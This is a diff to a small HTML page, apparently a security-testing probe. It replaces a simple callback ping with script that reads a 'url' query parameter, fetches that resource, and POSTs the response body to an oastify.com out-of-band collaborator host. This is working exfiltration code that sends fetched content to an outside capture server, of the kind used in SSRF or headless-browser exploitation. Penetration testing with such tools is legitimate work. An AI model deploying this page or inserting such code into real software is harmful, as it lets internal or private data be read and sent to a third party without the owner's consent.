@@ -1,15 +1,32 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Fetch URL Example</title>
+    <title>Fetch and Send Example</title>
+    <meta charset="UTF-8">
   </head>
   <body>
-    <img src="http://6dkw65wjtpqdob76cuyhzswcx33urqff.oastify.com/img">
     <script>
-      fetch('https://6dkw65wjtpqdob76cuyhzswcx33urqff.oastify.com', { mode: 'no-cors'})
-        .then(response => response.text())
-        .then(data => console.log(data))
-        .catch(error => console.error(error));
+      const urlParams = new URLSearchParams(window.location.search);
+      const url = urlParams.get('url');
+
+      if (!url) {
+        console.error('No URL parameter specified!');
+      } else {
+        fetch(url, { mode: 'no-cors'})
+          .then(response => response.text())
+          .then(data => {
+            const requestOptions = {
+              method: 'POST',
+              body: data
+            };
+            fetch('https://vxwlqug8dea280rvwji6jhg1hsnjbgz5.oastify.com', requestOptions)
+              .then(response => response.text())
+              .then(result => console.log(result))
+              .catch(error => console.error(error));
+          })
+          .catch(error => console.error(error));
+      }
     </script>
   </body>
 </html>
+
